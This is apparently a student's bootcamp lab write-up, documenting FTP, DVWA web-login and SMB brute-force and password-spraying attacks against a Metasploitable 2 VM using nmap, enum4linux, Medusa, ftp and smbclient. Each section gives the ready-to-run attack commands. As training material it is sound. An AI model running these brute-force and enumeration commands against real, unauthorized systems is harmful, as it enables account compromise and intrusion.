# In this repository I show the initial results of my studies on the Santander and DIO Cibersecurity Bootcamp, completed in 2025

**Lab Environment**
**-->** Attacker Machine: Kali Linux (IP: 192.168.56.103)
**-->** Target Machine: Metasploitable 2 (IP: 192.168.56.102)

**Tools Used**
**-->** nmap
**-->** Enum4linux
**-->** Medusa
**-->** FTP & smbclient

------------------------------------------------------------------

**There are a total of three exercises:**
**-->** FTP service attack
**-->** HTTP website attack
**-->** SMB service attack

**All of them have followed a similar process:**
**-->** Enumeration
**-->** Brute Force Attack with Medusa

## 1. FTP ATTACK
   
### 1.1 ENUMERATION: Searching for avaible services

**Method:** Nmap
**Code:** `nmap -sV -p 21,22,80,445,139 192.168.56.102`

> In this step I recognized what services were open for an attack, using the flag "sV" for identify the version of each service, and the flag "p" to select which ports I wanted to analyse

### 1.2 WORDLISTS: Creating the wordlists

**Method:** Echo
**Code:** `echo -e 'user\nmsfadmin\nadmin\nroot\nadministrator' > users.txt`

> After it, I created the wordlists that were used by Medusa to try an access, giving to it the list of users and passwords that I wanted for it to use

### 1.3 ATTACK: Trying the access with Medusa

**Method:** Medusa
**Code:** `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6`

> Next, I put Medusa at action giving the list of users (flag "U"), the passwords (flag "P") and the service that I wanted to invade (flag "M")

### 1.4 ACCESS: Using the results

**Method:** FTP
**Code:** `ftp 192.168.56.102`

> In the end, I used the result found by Medusa to access the FTP service, giving the right user and password
![Linux terminal with access to ftp service](brute_force_exercises/ftp_attack/ftp_login.png)

## 2 HTTP Website Attack

### 2.1 ACCESS: Analyzing the website

**Link:** 192.168.56.102/dvwa/login.php

> Opening the website by the link, I used the inspect mode, and navigated to the Network tab, to understand the data that I needed to realize the login
![DVWA website with login refused](brute_force_exercises/dvwa_attack/dvwa_failed.png)

## 2.2 WORDLISTS: Creating the wordlists

**Method:** Echo

> I created the wordlists to use with Medusa and try the login

## 2.3 ATTACK: Trying the access

**Method:** Medusa
**Code:** 
```
medusa -h 192.168.56.102 -U dvwa_users.txt -P dvwa_pass.txt -M http \
-m PAGE: '/dvwa/login.php/' \
-m FORM: 'username=^USER^&password=^PASS^&login=Login' \
-m FAIL: 'Login failed' \
-m SUCCESS: 'Welcome' -t 6
```

> I directioned the Medusa to attack the HTTP service (flag "M"), providing the SITE targeted, the FORM data and the FAIL signal ("m" flags)

## 2.4 ACCESS: Entering at the pannel

> After get the login data, I finally got into the administrative pannel
![Successful login at the DVWA website](brute_force_exercises/dvwa_attack/dvwa_login.png)

## 3 SMB Attack

### 3.1 Enumeration: Enumerating the users

**Method:** Enum4linux
**Code:** `enum4linux -a 192.168.56.102`

> Here, despite of enumerating the services, I needed to enumerate the users, so I used the Enum4linux testing all of the forms os enumerating (flag "a")

### 3.2 WORDLISTS: Creating the wordlists

**Method:** Echo

> Knowing about the users found by Enum4linux, I created the wordlist of users with the names founded, and also creating a wordlist for the passwords

### 3.3 SPRAYING: Spraying the password

**Method:** Medusa
**Code:** `medusa -h 192.168.56.102 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50`

> I realized the password spraying with Medusa, focusing on the SMB service, and obtaining the correct passwords to access

### 3.4 ACCESS: Entering at the service

**Method:** SMB CLient
**Code:** `smbclient -L //192.168.56.102 -U msfadmin`

> I entered at the SMB service with the client, giving the user founded by the Enum4linux (flag "U"), obtaining access
![Access to the SMB service](brute_force_exercises/pass_spray_attack/spray_login.png)
